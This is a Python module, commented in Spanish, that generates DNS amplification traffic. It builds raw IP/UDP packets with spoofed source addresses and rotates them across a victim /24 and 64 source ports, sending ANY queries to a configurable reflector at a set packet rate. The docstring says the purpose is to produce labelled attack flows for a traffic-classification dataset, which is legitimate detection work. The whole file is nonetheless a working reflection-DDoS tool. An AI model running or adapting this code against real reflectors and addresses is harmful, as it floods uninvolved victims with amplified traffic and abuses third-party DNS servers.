"""DNS amplification — spoofed-source ANY query a reflector.

Rotamos la IP víctima sobre su /24 y el source port. Un ataque de reflexión
real rocía múltiples víctimas; además el flow_extractor agrupa por 5-tupla, así
que variar (víctima, sport) produce cientos de flujos DNS_AMPLIFICATION en vez
de 1 colapsado — balanceando la clase con tráfico real, no sintético.
"""

from __future__ import annotations

import socket
import struct
import time

N_VICTIMS = 254
N_SPORTS = 64
BASE_SPORT = 30000


def run(cfg: dict) -> int:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except OSError:
        print("[!] DNS amplification requiere root + raw socket")
        return 1

    refl_ip = cfg["reflector_ip"]
    refl_port = cfg["reflector_port"]
    victims = _victim_pool(cfg["victim_ip"], int(cfg.get("victims", N_VICTIMS)))
    n_sports = int(cfg.get("src_ports", N_SPORTS))
    duration = cfg["duration_s"]
    rate = cfg.get("rate_pps", 1000)
    period = 1.0 / max(rate, 1.0)
    end = time.time() + duration

    qname = b"\x07example\x03com\x00"
    dns_query = b"\x12\x34\x01\x00" + b"\x00\x01\x00\x00\x00\x00\x00\x00" + qname + b"\x00\xff\x00\x01"
    nv, i = len(victims), 0
    while time.time() < end:
        victim_ip = victims[i % nv]
        sport = BASE_SPORT + (i % n_sports)
        i += 1
        ip_pkt = _ip(victim_ip, refl_ip, len(dns_query) + 8)
        udp_pkt = _udp(sport, refl_port, dns_query)
        try:
            sock.sendto(ip_pkt + udp_pkt, (refl_ip, refl_port))
        except OSError:
            pass
        time.sleep(period)
    return 0


def _victim_pool(base_ip: str, n: int) -> list[str]:
    a, b, c, _ = base_ip.split(".")
    return [f"{a}.{b}.{c}.{octet}" for octet in range(1, min(n, 254) + 1)]


def _ip(src: str, dst: str, payload_len: int) -> bytes:
    return struct.pack(
        "!BBHHHBBH4s4s",
        0x45, 0, 20 + payload_len, 1, 0, 64, socket.IPPROTO_UDP, 0,
        socket.inet_aton(src), socket.inet_aton(dst),
    )


def _udp(sport: int, dport: int, data: bytes) -> bytes:
    return struct.pack("!HHHH", sport, dport, 8 + len(data), 0) + data
